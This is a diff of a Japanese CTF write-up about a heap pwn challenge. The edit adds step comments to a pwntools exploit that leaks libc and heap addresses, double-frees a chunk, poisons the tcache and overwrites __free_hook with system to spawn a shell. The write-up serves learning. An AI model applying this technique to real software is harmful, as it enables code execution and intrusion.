@@ -112,7 +112,7 @@ gef➤  x/20gx 0x6020a0
 gef➤  
 ```
 
-上記で、list[0](@0x6020a0)がundefined、list[1](@0x6020a8)がStringでヒープアドレス、list[2](@0x6020b0)がDoubleでlist[3](@0x6020b8)がIntegerですね。Stringのmagicである`0000`と、Integerのmagicである`ffff`が確認できます。
+上記で、`list[0]`(@0x6020a0)がundefined、`list[1]`(@0x6020a8)がStringでヒープアドレス、`list[2]`(@0x6020b0)がDoubleで`list[3]`(@0x6020b8)がIntegerですね。Stringのmagicである`0000`と、Integerのmagicである`ffff`が確認できます。
 
 先のtype.hのコードの説明に戻ります。
 
@@ -275,7 +275,11 @@ if args.D:
     debug(r, [])
 
 bss = 0x6020a0
+
+# 1. forge pointer to got
 alloc(0, 2, struct.unpack('d', p64(elf.got.puts))[0])
+
+# 2. leak libc addr -> calc offset
 show()
 r.recvuntil('string] "')
 leak = u64(r.recvuntil('"')[:-1].ljust(8, '\x00'))
@@ -286,7 +290,10 @@ dbg('base')
 fh = base + 0x3ed8e8
 system = base + 0x4f4e0
 
+# 3. alloc one chunk
 alloc(1, 1, 'hoge')
+
+# 4. forge pointer to list[1] -> leak heap addr
 alloc(2, 2, struct.unpack('d', p64(bss+8))[0])
 show()
 r.recvuntil('string] "')
@@ -297,18 +304,24 @@ dbg('leak')
 heap = leak - 0x260
 dbg('heap')
 
+# 5. forge pointer to same addr in list[1]
 alloc(4, 2, struct.unpack('d', p64(heap+0x260))[0])
 
+# 6. delete heap+0x260 twice
 delete(1)
 delete(4)
 
+# 7. set next tcache to free_hook-8
 alloc(5, 1, p64(fh-8))
+
+# 8. fill tcache once
 alloc(6, 1, 'hoge')
 
+# 9. overwrite free_hook-8 -> "/bin/sh\x00", free_hook -> system to trigger free -> system("/bin/sh")
 r.sendlineafter('> ', '/bin/sh\x00' + p64(system))
 
 r.interactive()
 r.close()
 ```
 
-タイミングよく問題が投下された瞬間に画面を見られたので、FSOP問に続けて２つFirst Bloodを頂いてしまいました。Discordではメダルがもらえて謎にはしゃいでいましたが、順位はどんどん落ちて行きました。webとcryptoができないやつは単体火力になれないということ。きれいなwriteupがたくさん公開されているので、ちゃんと復習しようと思います。
+タイミングよく問題が投下された瞬間に画面を見られたので、FSOP問に続けて２つFirst Bloodを取れました。嬉しい。Discordではメダルがもらえて謎にはしゃいでいましたが、順位はどんどん落ちて行きました。webとcryptoができないやつは単体火力になれないということ。きれいなwriteupがたくさん公開されているので、ちゃんと復習しようと思います。
